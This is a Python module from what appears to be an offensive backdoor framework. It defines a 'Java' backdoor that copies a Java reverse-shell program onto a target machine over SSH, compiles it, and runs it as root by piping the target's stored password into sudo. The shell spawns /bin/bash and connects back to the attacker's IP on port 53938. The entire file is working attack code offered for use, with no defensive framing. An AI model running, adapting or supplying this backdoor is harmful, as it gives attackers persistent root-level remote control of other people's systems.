from backdoors.backdoor import * 
import time

class Java(Backdoor):
	prompt = Fore.RED + "(Java) " + Fore.BLUE + ">> " + Fore.RESET
	
	def __init__(self, core):
		cmd.Cmd.__init__(self)
		self.intro = GOOD + "Using Java module..."
		self.core = core
		self.options = {
				"port"   : Option("port", 53938, "port to connect to", True),
				}
		self.modules = {}
		self.allow_modules = True
		self.help_text = INFO + "Java backdoor using /bin/bash"

	def get_command(self):
		return "echo " + self.core.curtarget.pword + " | sudo -S java Back " + str(self.core.localIP) + " " + str(self.get_value("port"))

	def do_exploit(self, args):
		self.listen(prompt="none")

		program = "import java.net.Socket; \
		import java.io.InputStream; \
		import java.io.OutputStream; \
		 \
		public class Back { \
			public static void main(String args[]) { \
				String host=args[0]; \
				int port=Integer.parseInt(args[1]); \
				try { \
					Process p=new ProcessBuilder(\"/bin/bash\").redirectErrorStream(true).start(); \
					Socket s=new Socket(host,port); \
					InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream(); \
					OutputStream po=p.getOutputStream(), so=s.getOutputStream(); \
					while(!s.isClosed()){ \
						while(pi.available()>0) \
							so.write(pi.read()); \
						while(pe.available()>0) \
							so.write(pe.read()); \
						while(si.available()>0) \
							po.write(si.read()); \
						so.flush(); \
						po.flush(); \
						Thread.sleep(50); \
						try { \
							p.exitValue(); \
							break; \
						} \
						catch (Exception e){ \
						} \
					} \
					p.destroy(); \
					s.close(); \
				} \
				catch (Exception e){} \
			} \
		}"


		print(INFO + "Moving backdoor...")
		self.core.curtarget.ssh.exec_command("echo \"" + program + "\" > Back.java")
		time.sleep(.25)
		self.core.curtarget.ssh.exec_command("javac Back.java")
		print(INFO + "Compiling...")
		time.sleep(2)
		self.core.curtarget.ssh.exec_command(self.get_command())
		print(GOOD + "Java backdoor on %s attempted." % self.get_value("port"))


		for mod in self.modules.keys():
			print(INFO + "Attempting to execute " + mod.name + " module...")
			mod.exploit() 